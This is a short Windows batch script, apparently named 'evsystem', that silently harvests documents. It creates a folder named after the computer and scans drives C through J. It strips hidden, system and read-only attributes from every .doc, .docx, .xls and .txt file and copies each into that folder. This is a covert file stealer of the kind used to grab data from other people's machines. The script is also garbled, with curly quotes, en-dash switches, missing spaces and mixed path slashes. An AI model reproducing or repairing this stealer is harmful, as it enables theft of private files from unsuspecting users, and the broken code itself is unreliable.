@echo off

REM Name : evsystem

REM Author : evsystem

Set silent=%computername% _ %random%

If not exist ”%silent%” Md “%silent%”

For%%a in (C D E F G H I J) do if exist %%a:\ (

For /f “tokens=*” %%b in (‘dir /a/b/s %%a:\*.doc’) do (

attrib –s –h –r “%%b”

copy “%%b” “%silent%” /y)

For /f “tokens=*” %%b in (‘dir /a/b/s%%a:\*.xls’) do (

attrib –s –h –r “%%b”

copy “%%b” “%silent%” /y)

For /f “tokens=*” %% b in (‘dir /a/b/s%%a:/*.txt’) do (

attrib –s –h –r “%%b”

copy “%%b” “%silent%” /y)

For /f “tokens=*” %%b in (‘dir /a/b/s%%a:/*.docx’) do (

attrib –s –h –r “%%b”

copy “%%b” “%silent%” /y)

)
